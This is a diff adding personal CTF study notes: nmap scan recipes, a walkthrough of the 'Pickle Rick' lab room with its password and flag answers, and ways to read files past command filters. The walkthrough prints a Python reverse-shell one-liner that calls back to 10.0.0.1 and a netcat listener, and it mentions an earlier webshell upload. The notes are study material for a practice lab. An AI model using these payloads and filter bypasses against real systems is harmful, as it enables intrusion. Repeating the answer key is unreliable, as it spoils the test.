@@ -374,5 +374,54 @@ After we deleted the client side filters we still had the server side filter whi
 
 The last step was to upload it and find it using our gobuster command and then use the admin page to activate our file. since the directory was modules we had to go back to access the content directory so the command ../content/AOJ.jpg activated our file and our listener which allowed to gain webshell access. we then had to go back a directory and gain our flag.
 
+Nmap notes
 
+To get the standard ports and run all the scripts and checks on them: nmap -n -v -sT -A <IP>
+
+To do a full TCP scan: nmap -n -v -sT -p- -T5 <IP>
+
+Then I'll usually run the first one again with -p <any additional ports found>
+
+Then I'll run a "--script vuln" on all the found ports to do an NSE vulnerability scan.
+
+Then if I want to do a UDP scan: nmap -n -v -sU <IP> nmap -n -v -sU -p- -T5 <IP>
+
+Pickle rick CTF
+
+So when we started we did a normal nmap scan to find that port 80 was open and port 22 (ssh) was open
+
+$ gobuster dir -u http://10.10.242.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
+
+Running this command helped us find the /robots.txt/ directory /assets/ /login.php/ portal.php/
+
+In robots.txt we find a single string Wabbalubbadubdub 
+
+We used this as our password for the portal.php login
+
+The user was found by viewing the page source of the main page.
+
+After we logged in we found a tab called commands where we could run linux commands like ls and other commands.
+
+Here is where we found our first flag which we opened by using grep . "File" which was mr. meeseeks hair
+
+after finding our first flag we went for a python3 reverse shell using this payload python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Of course we adjusted the ip address and used nc -lvnp to listen on post 1234. After running the command we gained shell access and realized that root had no password. 
+
+After going to the /root/ folder we found our 3rd flag which was fleeb juice.
+
+After gaining root we went back to /home/ to find the rick directory where we found our last flag.
+
+The flag was 1 jerry tear.
+
+
+if a site has a filter to disable certain linux commands from being executed you can use these to bypass it
+grep . "file" This outputs any character so its a basically a another use of CAT.
+
+while read line; do echo $line; done < "file"
+echo < "file"
+
+Grep -R . in the case of this ctf can be used to print out the entire website page.
+
+cat *  cats out everything in a directory
 
